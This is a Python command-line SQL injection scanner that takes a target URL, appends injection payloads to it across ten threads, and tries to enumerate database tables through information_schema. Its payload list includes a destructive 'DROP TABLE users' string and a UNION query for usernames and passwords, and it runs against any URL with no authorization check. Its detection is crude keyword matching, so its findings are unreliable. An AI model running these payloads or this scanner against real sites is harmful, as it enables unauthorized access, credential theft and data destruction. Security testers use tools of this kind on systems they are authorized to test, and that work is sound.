import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import logging
import threading
import time
from queue import Queue
from colorama import Fore, init

# Initialize colorama for colored output
init(autoreset=True)

# Set up logging with colorized output
logger = logging.getLogger()

class ColorizedFormatter(logging.Formatter):
    COLORS = {
        'INFO': Fore.GREEN,
        'WARNING': Fore.YELLOW,
        'ERROR': Fore.RED,
        'DEBUG': Fore.CYAN,
        'CRITICAL': Fore.RED + '[ CRITICAL ]' + Fore.RESET
    }

    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, Fore.WHITE)
        record.levelname = f"{color}[{levelname}]{Fore.RESET}"  # Add color to log level
        return super().format(record)

# Set up logging configuration
console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorizedFormatter('%(levelname)s - %(message)s'))
logger.addHandler(console_handler)
logger.setLevel(logging.INFO)

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR 1=1 --",  # Common payload
    "' OR 'a'='a",  # Another common payload
    "'; DROP TABLE users --",  # Destructive payload
    "'; SELECT * FROM information_schema.tables --",  # List tables
    "' AND 1=2 --",  # False condition
    "' UNION SELECT null, username, password FROM users --"  # Union to get usernames and passwords
]

# Configuration for the scanner
MAX_THREADS = 10  # Maximum number of threads for concurrent scanning
REQUEST_DELAY = 1  # Delay between requests to avoid overloading the server
url_queue = Queue()
threads = []

# The function to perform SQLi scanning
def scan_url(url, session, dbs=False):
    try:
        logger.info(f"Scanning: {url}")
        response = session.get(url, timeout=10)
        
        if response.status_code == 200:
            if dbs:
                logger.info("Looking for databases...")
                test_sqli_dbs(url, session)
            else:
                for payload in SQLI_PAYLOADS:
                    test_sqli(url, payload, session)
        else:
            logger.warning(f"Failed to fetch {url} - Status code: {response.status_code}")
    except Exception as e:
        logger.critical(f"Critical error scanning {url}: {str(e)}")

# Function to test SQL Injection vulnerabilities
def test_sqli(url, payload, session):
    test_url = f"{url}{payload}"
    
    try:
        response = session.get(test_url, timeout=10)
        
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            logger.warning(f"Potential SQL Injection found on {url} with payload: {payload}")
        
        # Additional checks for specific error messages
        if "mysql" in response.text.lower() or "syntax error" in response.text.lower():
            logger.warning(f"Possible MySQL SQLi on {url} with payload: {payload}")
    except requests.exceptions.RequestException as e:
        logger.critical(f"Request failed for {url} with payload {payload}: {str(e)}")

# Function to test for databases
def test_sqli_dbs(url, session):
    db_payload = "' UNION SELECT null, database() --"
    try:
        response = session.get(f"{url}{db_payload}", timeout=10)
        if "error" not in response.text.lower():
            logger.info(f"Potentially retrieving databases from: {url}")
            retrieve_databases(url, session)
    except requests.exceptions.RequestException as e:
        logger.critical(f"Request failed for {url} with db payload: {str(e)}")

# Function to retrieve databases using SQL Injection
def retrieve_databases(url, session):
    db_enum_payload = "' UNION SELECT null, table_name FROM information_schema.tables --"
    try:
        response = session.get(f"{url}{db_enum_payload}", timeout=10)
        if "error" not in response.text.lower():
            logger.info(f"Databases retrieved from {url}: {response.text[:200]}")  # Display portion of result
    except requests.exceptions.RequestException as e:
        logger.critical(f"Request failed for {url} with enum db payload: {str(e)}")

# Worker function for threading
def worker():
    session = requests.Session()
    while not url_queue.empty():
        url, dbs = url_queue.get()
        scan_url(url, session, dbs)
        time.sleep(REQUEST_DELAY)

# Function to start scanning process with threading
def start_scanning(base_url, dbs=False):
    session = requests.Session()
    
    # Add initial URL to queue
    url_queue.put((base_url, dbs))
    
    # Create and start threads
    for i in range(MAX_THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Wait for threads to finish
    for t in threads:
        t.join()

# Main function to start the scanning
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
    parser.add_argument("-u", "--url", help="Target URL to scan", required=True)
    parser.add_argument("-dbs", "--databases", help="Enumerate SQL databases (default: False)", action="store_true")
    args = parser.parse_args()

    logger.info(f"Starting SQL Injection scan on {args.url}...")
    
    # Start scanning from the base URL
    start_scanning(args.url, args.databases)

if __name__ == "__main__":
    main()
